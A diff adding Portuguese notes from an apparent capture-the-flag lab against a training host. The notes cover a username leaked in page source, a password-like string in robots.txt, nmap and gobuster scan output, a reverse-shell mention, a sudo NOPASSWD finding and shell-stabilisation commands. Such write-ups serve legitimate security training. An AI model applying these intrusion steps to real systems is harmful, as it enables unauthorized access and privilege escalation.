@@ -1,0 +1,54 @@
+IP ALVO: 10.10.224.230
+
+
+- Inspecionando o codigo fonte da pagina, continha essa informacao 
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+    
+- nmap para verificar as portas 
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+- gobuster para verificar os diretorios do alvo
+/.htaccess            (Status: 403) [Size: 297]
+/.htpasswd            (Status: 403) [Size: 297]
+/assets               (Status: 301) [Size: 315] [--> http://10.10.224.230/assets/]
+/robots.txt           (Status: 200) [Size: 17]
+/server-status        (Status: 403) [Size: 301]
+
+
+- dentro do robots.txt foi encontrado essa informacao: 
+Wubbalubbadubdub
+
+
+- o assets e um diretorio http, entao da para tentar realizar um shell reverse
+
+
+- foi realizado o comando com php especifico para confirmar que existe um diretorio php, o mais comum seria uma pagina de login: 
+gobuster dir -u `cat ip` -w /usr/share/dirb/wordlists/common.txt -t 50 -x php -q 
+/assets               (Status: 301) [Size: 315] [--> http://10.10.224.230/assets/]
+/denied.php           (Status: 302) [Size: 0] [--> /login.php]
+/index.html           (Status: 200) [Size: 1062]
+/login.php            (Status: 200) [Size: 882]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]
+/robots.txt           (Status: 200) [Size: 17]
+
+- apos conectar na maquina atraves do shell reverse, sera feito o comando sudo -l -> serve para ver as permissoes de sudo 
+        ip-10-10-224-230.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+	foi identificado que qualquer usuario pode executar qualquer comando sem precisar de senha, inclusive comandos de super usuario 
+
+
+COMANDOS PARA ARRUMAR A SHELL:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+- dar um ctrl + z
+stty raw -echo; fg; ls; export SHELL=/bin/bash; stty rows 38 columns 116; reset;
+export TERM=xterm
+
+
+
+
+  
